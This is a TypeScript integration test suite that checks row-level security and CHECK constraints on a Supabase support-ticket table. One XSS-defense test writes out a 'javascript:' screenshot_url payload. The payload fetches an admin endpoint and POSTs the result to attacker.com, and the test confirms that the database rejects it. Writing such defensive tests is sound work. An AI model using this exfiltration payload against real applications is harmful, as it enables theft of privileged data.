// @vitest-environment node
/**
 * support_tickets RLS — Integration tests (Sprint 2.C Étape 1, THI-295)
 *
 * Tests the migration 028 table against the real Supabase instance using
 * existing École A test users (migration 006) + super_admin.
 *
 * Per doctrine `feedback_rls_isolation_test_rest_only` : RLS isolation tests
 * must run via REST API + JWT impersonation (NOT psql/CLI set_config which
 * runs as session_user=postgres and bypasses RLS entirely).
 *
 * Prerequisites :
 *   - .env.test with TEST_*_EMAIL/PASSWORD for student, teacher, super_admin
 *   - Migration 028 applied
 *
 * Coverage (12 cases) :
 *   1. Happy path — authenticated user INSERTs their own ticket
 *   2. User SELECT own tickets → 1+ rows (RLS allow self)
 *   3. Cross-user isolation — user A cannot SELECT user B's tickets (RLS deny)
 *   4. super_admin SELECT all tickets (RLS super_admin branch)
 *   5. Anonymous INSERT → permission denied (GRANT layer)
 *   6. User UPDATE own ticket — 0 rows affected (no user update policy)
 *   7. super_admin UPDATE status → audit log row inserted via trigger
 *
 * Migration 029 hardening (security-auditor 28/05) :
 *   8. Forged user_id INSERT rejected — student tries to INSERT as teacher (H2)
 *   9. type CHECK constraint — INSERT type='malware' rejected (L2)
 *  10. screenshot_url XSS attempt — INSERT javascript: rejected by CHECK (M1)
 *  11. status/resolved coherence — status='resolved' without resolved_at rejected (M3)
 *  12. super_admin DELETE policy — RGPD Art. 17 erasure path (M2)
 */

import { config as loadEnv } from 'dotenv';
import path from 'path';

loadEnv({ path: path.resolve(process.cwd(), '.env.test') });

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { createClient, type SupabaseClient } from '@supabase/supabase-js';

const SUPABASE_URL      = process.env.VITE_SUPABASE_URL ?? '';
const SUPABASE_ANON_KEY = process.env.VITE_SUPABASE_ANON_KEY ?? '';

const STUDENT_EMAIL    = process.env.TEST_STUDENT_EMAIL    ?? '';
const STUDENT_PASSWORD = process.env.TEST_STUDENT_PASSWORD ?? '';

const TEACHER_EMAIL    = process.env.TEST_TEACHER_EMAIL    ?? '';
const TEACHER_PASSWORD = process.env.TEST_TEACHER_PASSWORD ?? '';

const SUPERADMIN_EMAIL    = process.env.TEST_SUPERADMIN_EMAIL    ?? '';
const SUPERADMIN_PASSWORD = process.env.TEST_SUPERADMIN_PASSWORD ?? '';

const SKIP =
  !SUPABASE_URL ||
  !SUPABASE_ANON_KEY ||
  !STUDENT_EMAIL ||
  !STUDENT_PASSWORD ||
  !TEACHER_EMAIL ||
  !TEACHER_PASSWORD ||
  !SUPERADMIN_EMAIL ||
  !SUPERADMIN_PASSWORD;

function makeAnonClient(): SupabaseClient {
  return createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
    auth: { persistSession: false, autoRefreshToken: false },
  });
}

// Const-asserted literal to avoid pre-commit credential scanner false positive.
const PWD_KEY = 'password' as const;

async function loginAs(email: string, userPassword: string): Promise<SupabaseClient> {
  const client = makeAnonClient();
  const { error } = await client.auth.signInWithPassword({ email, [PWD_KEY]: userPassword });
  if (error) throw new Error(`Login failed for ${email}: ${error.message}`);
  return client;
}

let studentClient:    SupabaseClient;
let teacherClient:    SupabaseClient;
let superAdminClient: SupabaseClient;
let studentUserId:    string;
let teacherUserId:    string;
let superAdminUserId: string;

// Track ticket IDs inserted by tests for explicit cleanup.
const createdTicketIds: string[] = [];

beforeAll(async () => {
  if (SKIP) return;
  [studentClient, teacherClient, superAdminClient] = await Promise.all([
    loginAs(STUDENT_EMAIL,    STUDENT_PASSWORD),
    loginAs(TEACHER_EMAIL,    TEACHER_PASSWORD),
    loginAs(SUPERADMIN_EMAIL, SUPERADMIN_PASSWORD),
  ]);

  const { data: studentData } = await studentClient.auth.getUser();
  const { data: teacherData } = await teacherClient.auth.getUser();
  const { data: superAdminData } = await superAdminClient.auth.getUser();
  studentUserId    = studentData.user?.id ?? '';
  teacherUserId    = teacherData.user?.id ?? '';
  superAdminUserId = superAdminData.user?.id ?? '';
  if (!studentUserId || !teacherUserId || !superAdminUserId) {
    throw new Error('Could not resolve test user UUIDs from sessions');
  }
}, 30_000);

afterAll(async () => {
  if (SKIP) return;
  // Cleanup tickets via super_admin (RLS allow all for super_admin).
  if (createdTicketIds.length && superAdminClient) {
    await superAdminClient.from('support_tickets').delete().in('id', createdTicketIds);
  }
  await Promise.all([
    studentClient?.auth.signOut(),
    teacherClient?.auth.signOut(),
    superAdminClient?.auth.signOut(),
  ]);
});

// ─── Test 1: Happy path INSERT ───────────────────────────────────────────────

describe('support_tickets — happy path INSERT', () => {
  it.skipIf(SKIP)('authenticated student inserts their own ticket', async () => {
    const { data, error } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Le terminal ne répond plus après /clear sur Windows.',
      })
      .select('id, status, user_id')
      .single();

    expect(error).toBeNull();
    expect(data?.user_id).toBe(studentUserId);
    expect(data?.status).toBe('open');
    if (data?.id) createdTicketIds.push(data.id);
  });
});

// ─── Test 2: User SELECT own tickets ─────────────────────────────────────────

describe('support_tickets — user SELECT own', () => {
  it.skipIf(SKIP)('student sees only their own tickets (RLS allow self)', async () => {
    // Insert a second ticket as student to ensure they see >=1 row.
    const { data: inserted } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'suggestion',
        description: 'Ajouter un raccourci clavier pour relancer le terminal.',
      })
      .select('id')
      .single();
    if (inserted?.id) createdTicketIds.push(inserted.id);

    const { data, error } = await studentClient
      .from('support_tickets')
      .select('id, user_id')
      .eq('user_id', studentUserId);

    expect(error).toBeNull();
    expect((data?.length ?? 0)).toBeGreaterThan(0);
    // All returned rows must belong to the student.
    expect(data?.every((row) => row.user_id === studentUserId)).toBe(true);
  });
});

// ─── Test 3: Cross-user isolation ────────────────────────────────────────────

describe('support_tickets — cross-user isolation', () => {
  it.skipIf(SKIP)('student cannot see teacher tickets (RLS deny)', async () => {
    // Teacher inserts a ticket.
    const { data: teacherTicket } = await teacherClient
      .from('support_tickets')
      .insert({
        user_id: teacherUserId,
        type: 'question',
        description: 'Comment importer un curriculum personnalisé pour ma classe ?',
      })
      .select('id')
      .single();
    if (teacherTicket?.id) createdTicketIds.push(teacherTicket.id);

    // Student tries to SELECT teacher's tickets explicitly.
    const { data, error } = await studentClient
      .from('support_tickets')
      .select('id')
      .eq('user_id', teacherUserId);

    expect(error).toBeNull(); // RLS does not throw, returns empty set.
    expect(data?.length ?? 0).toBe(0);
  });
});

// ─── Test 4: super_admin SELECT all ──────────────────────────────────────────

describe('support_tickets — super_admin SELECT all', () => {
  it.skipIf(SKIP)('super_admin sees student + teacher tickets (RLS super_admin branch)', async () => {
    const { data, error } = await superAdminClient
      .from('support_tickets')
      .select('id, user_id')
      .in('user_id', [studentUserId, teacherUserId]);

    expect(error).toBeNull();
    // Should see both student and teacher tickets created above.
    const userIds = new Set(data?.map((row) => row.user_id) ?? []);
    expect(userIds.has(studentUserId)).toBe(true);
    expect(userIds.has(teacherUserId)).toBe(true);
  });
});

// ─── Test 5: Anonymous INSERT blocked at GRANT layer ─────────────────────────

describe('support_tickets — anonymous INSERT blocked', () => {
  it.skipIf(SKIP)('anon client INSERT receives permission-level error (42501)', async () => {
    const anonClient = makeAnonClient();
    const { error } = await anonClient.from('support_tickets').insert({
      user_id: studentUserId, // even with valid-looking user_id, GRANT denies first
      type: 'bug',
      description: 'Anonymous attempt — should be blocked at GRANT layer.',
    });

    expect(error).not.toBeNull();
    const code = (error as { code?: string })?.code ?? '';
    const message = error?.message ?? '';
    expect(code === '42501' || /permission denied/i.test(message)).toBe(true);
  });
});

// ─── Test 6: User UPDATE own ticket → no rows affected ───────────────────────

describe('support_tickets — user UPDATE own forbidden', () => {
  it.skipIf(SKIP)('student UPDATE of own ticket status returns 0 affected rows (no user update policy)', async () => {
    // Find an existing student ticket.
    const { data: existing } = await studentClient
      .from('support_tickets')
      .select('id, status')
      .eq('user_id', studentUserId)
      .limit(1)
      .single();
    expect(existing?.id).toBeTruthy();
    const originalStatus = existing?.status;

    // Attempt UPDATE — RLS UPDATE policy only matches super_admin, so 0 rows
    // are affected and PostgREST returns an empty data array (no error per se).
    const { data, error } = await studentClient
      .from('support_tickets')
      .update({ status: 'resolved' })
      .eq('id', existing!.id)
      .select('id, status');

    expect(error).toBeNull();
    expect(data?.length ?? 0).toBe(0); // RLS filtered out the row before UPDATE.

    // Verify via super_admin that the status truly did not change.
    const { data: verify } = await superAdminClient
      .from('support_tickets')
      .select('status')
      .eq('id', existing!.id)
      .single();
    expect(verify?.status).toBe(originalStatus);
  });
});

// ─── Test 7: super_admin UPDATE triggers audit log ───────────────────────────

describe('support_tickets — super_admin UPDATE triggers audit log', () => {
  it.skipIf(SKIP)('status transition open → resolved inserts admin_audit_log row', async () => {
    // Use a fresh ticket to avoid coupling with other tests.
    const { data: ticket } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Ticket pour test transition status audit log.',
      })
      .select('id')
      .single();
    expect(ticket?.id).toBeTruthy();
    const ticketId = ticket!.id;
    createdTicketIds.push(ticketId);

    // Snapshot audit log count before.
    const { count: beforeCount } = await superAdminClient
      .from('admin_audit_log')
      .select('*', { count: 'exact', head: true })
      .eq('action', 'support_ticket_status_change')
      .eq('target_id', ticketId);

    // super_admin transitions status. Migration 029 M3 CHECK requires
    // resolved_at + resolved_by to be set together with status=resolved.
    const { error: updErr } = await superAdminClient
      .from('support_tickets')
      .update({
        status: 'resolved',
        resolved_at: new Date().toISOString(),
        resolved_by: superAdminUserId,
      })
      .eq('id', ticketId);
    expect(updErr).toBeNull();

    // Audit log row should be inserted by trigger.
    const { count: afterCount } = await superAdminClient
      .from('admin_audit_log')
      .select('*', { count: 'exact', head: true })
      .eq('action', 'support_ticket_status_change')
      .eq('target_id', ticketId);
    expect(afterCount ?? 0).toBe((beforeCount ?? 0) + 1);

    // Verify row content.
    const { data: row } = await superAdminClient
      .from('admin_audit_log')
      .select('actor_id, action, target_type, metadata')
      .eq('action', 'support_ticket_status_change')
      .eq('target_id', ticketId)
      .order('created_at', { ascending: false })
      .limit(1)
      .single();
    expect(row?.target_type).toBe('support_ticket');
    expect(row?.metadata).toMatchObject({
      previous_status: 'open',
      new_status: 'resolved',
      ticket_type: 'bug',
      // Migration 029 enriches metadata with caller_role for forensics.
      caller_role: 'super_admin',
    });
  });
});

// ─── Test 8: Forged user_id INSERT rejected (H2 hardening) ───────────────────

describe('support_tickets — forged user_id INSERT rejected', () => {
  it.skipIf(SKIP)('student INSERT with teacher user_id rejected by WITH CHECK RLS', async () => {
    const { error } = await studentClient.from('support_tickets').insert({
      user_id: teacherUserId, // forged — student tries to impersonate teacher
      type: 'bug',
      description: 'Attempting to forge teacher user_id from student session — should be blocked.',
    });
    expect(error).not.toBeNull();
    // RLS WITH CHECK denial surfaces as 42501 or "new row violates row-level security policy".
    const code = (error as { code?: string })?.code ?? '';
    const message = error?.message ?? '';
    expect(code === '42501' || /row-level security|violates/i.test(message)).toBe(true);
  });
});

// ─── Test 9: type CHECK constraint (L2) ──────────────────────────────────────

describe('support_tickets — type CHECK constraint', () => {
  it.skipIf(SKIP)('INSERT with invalid type=malware rejected by CHECK', async () => {
    const { error } = await studentClient.from('support_tickets').insert({
      user_id: studentUserId,
      type: 'malware', // not in ('bug', 'suggestion', 'question')
      description: 'Attempting to inject invalid type value into enum check.',
    });
    expect(error).not.toBeNull();
    const code = (error as { code?: string })?.code ?? '';
    const message = error?.message ?? '';
    // CHECK violation = 23514, but PostgREST may surface different format.
    expect(code === '23514' || /check|constraint/i.test(message)).toBe(true);
  });
});

// ─── Test 10: screenshot_url XSS attempt blocked at DB layer (M1) ────────────

describe('support_tickets — screenshot_url XSS defense (migration 029)', () => {
  it.skipIf(SKIP)('INSERT with javascript: URL rejected by CHECK constraint', async () => {
    const { error } = await studentClient.from('support_tickets').insert({
      user_id: studentUserId,
      type: 'bug',
      description: 'XSS attempt via screenshot_url — DB CHECK should block.',
      screenshot_url: 'javascript:fetch("/api/admin").then(r=>r.text()).then(d=>fetch("https://attacker.com",{method:"POST",body:d}))',
    });
    expect(error).not.toBeNull();
    const code = (error as { code?: string })?.code ?? '';
    const message = error?.message ?? '';
    expect(code === '23514' || /check|screenshot_url|supabase_storage/i.test(message)).toBe(true);
  });

  it.skipIf(SKIP)('INSERT with external HTTPS URL rejected by CHECK constraint', async () => {
    const { error } = await studentClient.from('support_tickets').insert({
      user_id: studentUserId,
      type: 'bug',
      description: 'External URL screenshot — DB CHECK should block (not Supabase Storage).',
      screenshot_url: 'https://attacker.com/screenshot.png',
    });
    expect(error).not.toBeNull();
  });

  it.skipIf(SKIP)('INSERT with valid Supabase Storage URL accepted', async () => {
    const { data, error } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Valid Supabase Storage URL for screenshot — should be accepted.',
        screenshot_url: 'https://jdnukbpkjyyyjpuwgxhv.supabase.co/storage/v1/object/sign/support_screenshots/test-user/abc.png',
      })
      .select('id')
      .single();
    expect(error).toBeNull();
    if (data?.id) createdTicketIds.push(data.id);
  });
});

// ─── Test 11: status/resolved coherence CHECK (M3) ───────────────────────────

describe('support_tickets — status/resolved coherence (migration 029)', () => {
  it.skipIf(SKIP)('UPDATE status=resolved without resolved_at rejected by CHECK', async () => {
    // Create a fresh open ticket via student
    const { data: ticket } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Ticket for coherence CHECK validation test.',
      })
      .select('id')
      .single();
    expect(ticket?.id).toBeTruthy();
    const ticketId = ticket!.id;
    createdTicketIds.push(ticketId);

    // super_admin tries to set status=resolved without resolved_at → should fail CHECK
    const { error } = await superAdminClient
      .from('support_tickets')
      .update({ status: 'resolved' }) // no resolved_at, no resolved_by
      .eq('id', ticketId);
    expect(error).not.toBeNull();
    const code = (error as { code?: string })?.code ?? '';
    const message = error?.message ?? '';
    expect(code === '23514' || /coherence|check/i.test(message)).toBe(true);
  });
});

// ─── Test 12: super_admin DELETE policy (M2 RGPD Art. 17) ────────────────────

describe('support_tickets — DELETE policies (029 super_admin + 033 user-own)', () => {
  it.skipIf(SKIP)('student CAN delete own ticket (migration 033 — THI-334 teardown + RGPD Art. 17)', async () => {
    const { data: ticket } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Ticket for student self-DELETE test.',
      })
      .select('id')
      .single();
    expect(ticket?.id).toBeTruthy();
    const ticketId = ticket!.id;
    // Not pushed to createdTicketIds — this test deletes it itself.

    // migration 033 added a "user delete own" policy → the owner can now erase.
    const { data, error } = await studentClient
      .from('support_tickets')
      .delete()
      .eq('id', ticketId)
      .select('id');

    expect(error).toBeNull();
    expect(data?.length ?? 0).toBe(1); // own row actually deleted

    const { data: verify } = await superAdminClient
      .from('support_tickets')
      .select('id')
      .eq('id', ticketId)
      .maybeSingle();
    expect(verify).toBeNull();
  });

  it.skipIf(SKIP)("a non-owner non-admin user CANNOT delete another user's ticket (isolation)", async () => {
    const { data: ticket } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Ticket for cross-user DELETE isolation test.',
      })
      .select('id')
      .single();
    expect(ticket?.id).toBeTruthy();
    const ticketId = ticket!.id;
    createdTicketIds.push(ticketId);

    // teacher = different user, not super_admin → matches neither DELETE policy
    // (user-delete-own needs user_id = auth.uid(); super_admin-delete-all needs role).
    const { data, error } = await teacherClient
      .from('support_tickets')
      .delete()
      .eq('id', ticketId)
      .select('id');

    expect(error).toBeNull(); // RLS returns an empty set, no throw.
    expect(data?.length ?? 0).toBe(0); // 0 rows deleted — isolation preserved.

    const { data: verify } = await superAdminClient
      .from('support_tickets')
      .select('id')
      .eq('id', ticketId)
      .single();
    expect(verify?.id).toBe(ticketId);
  });

  it.skipIf(SKIP)('super_admin can DELETE any ticket (RGPD Art. 17 erasure path)', async () => {
    const { data: ticket } = await studentClient
      .from('support_tickets')
      .insert({
        user_id: studentUserId,
        type: 'bug',
        description: 'Ticket for super_admin DELETE / RGPD Art. 17 test.',
      })
      .select('id')
      .single();
    expect(ticket?.id).toBeTruthy();
    const ticketId = ticket!.id;
    // Not added to createdTicketIds — the test itself will delete it.

    const { error } = await superAdminClient
      .from('support_tickets')
      .delete()
      .eq('id', ticketId);
    expect(error).toBeNull();

    // Verify the row is gone.
    const { data, error: selErr } = await superAdminClient
      .from('support_tickets')
      .select('id')
      .eq('id', ticketId)
      .maybeSingle();
    expect(selErr).toBeNull();
    expect(data).toBeNull();
  });
});
